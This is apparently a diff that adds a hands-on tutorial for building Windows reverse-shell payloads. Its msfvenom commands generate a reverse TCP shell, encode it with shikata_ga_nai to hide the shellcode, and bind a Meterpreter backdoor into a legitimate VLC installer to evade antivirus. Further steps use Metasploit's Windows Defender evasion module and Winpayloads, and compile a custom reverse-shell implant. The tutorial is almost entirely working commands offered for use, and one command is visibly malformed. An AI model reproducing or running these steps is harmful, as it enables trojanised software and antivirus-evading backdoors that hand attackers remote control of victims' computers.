@@ -1,0 +1,54 @@
+Msfvenom Raw payload
+Use the following command to generate a basic Reverse TCP Shell. You’ll need Kali Linux or any other Operating System with Metasploit Framework installed in it.
+
+# Replace with your own IP and Port number
+# LHOST = [Your IP Address], LPORT = [Port number you wanna listen on]
+ubuntu@ubuntu:~$ sudo msfvenom -p windows/shell_reverse_tcp lhost=192.168.1.100 LPORT=4444 -f exe -o shell_reverse.exe
+ubuntu@ubuntu:~$ ls -la shell_reverse.exe
+
+Encoding the Raw Payload
+Now we’ll encode our payload with Msfvenom’s “shikata_ga_nai” encoder iteratively to hide our shell code. Let see if we get anything useful.
+
+# -i [number of encoding iterations], -e [name of encoder]
+ubuntu@ubuntu:~$ sudo msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp -e x86/shikata_ga_nai -b '\x00' lhost=192.168.1.100 lport=4444 -i 15 -f exe -o encoded_shell.exe
+ubuntu@ubuntu:~$ ls -la encoded_shell.exe
+
+Binding Shell Code to Non-malicious Executable
+Binding your malicious file to a non-malicious executable binary can help you evade signature detection. We’ll bind our Reverse Shell with a legit VLC Media Player Installer and we can do this by using Msfvenom. Locate the VLC’s installer file in your terminal.
+
+ubuntu@ubuntu:~$ ls -la vlc-3.0.0-win32.exe
+# Change ip, input/output files and port number with your own
+# LHOST = [Attacker's IP Address], LPORT = [Attacker's Port number]
+ubuntu@ubuntu:~$ sudo msfvenom -a x86 --platform windows -x vlc-3.0.0.win32.exe -k -p windows/meterpreter/reverse_tcp lhost=192.168.1.100 lport 4444-e x86/shikata_ga_nai -i 3 -b "\x00" -f exe -o vlc-media-player-backdoored.exe
+
+Metasploit’s Windows Defender Evasion Module
+A new module was introduced to Metasploit Framework, probably in Metasploit 5 release. The purpose of this module to evade particularly Windows Defender using the combination of different anti-virus evasion techniques. As anti-viruses update their databases and methods regularly, so this technique might not work every time in future. But let’s try this,
+
+ubuntu@ubuntu:~$ sudo msfconsole
+msf5 > show evasion
+...snip...
+   Name                             Disclosure Date  Rank    Check  Description
+   ----                             ---------------  ----    -----  -----------
+   windows/windows_defender_exe                      normal  No     Microsoft Windows Defender Evasive Executable
+...snip...
+msf5 > use windows/windows_defender_exe
+msf5 evasion(windows/windows_defender_exe) > show options
+msf5 evasion(windows/windows_defender_exe) > set payload windows/meterpreter/reverse_https
+msf5 evasion(windows/windows_defender_exe) > run
+[*] Compiled executable size: 3584
+[+] windows_defender_evador.exe stored at /home/azad/.msf4/local/windows_defend
+
+root@kali:~# git clone https://github.com/nccgroup/Winpayloads.git
+root@kali:~# cd Winpayloads/
+root@kali:~/Winpayloads# ./setup.sh
+root@kali:~/Winpayloads# ./WinPayloads.py
+
+Modifying & Using Custom Payloads
+azad@ubuntu:~/Desktop$ git clone https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment.git
+Cloning into 'ScriptDotSh-MalwareDevelopment'...
+remote: Enumerating objects: 26, done.
+remote: Total 26 (delta 0), reused 0 (delta 0), pack-reused 26
+Unpacking objects: 100% (26/26), done.
+azad@ubuntu:~/Desktop$ cd ScriptDotSh-MalwareDevelopment/
+$ i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
+
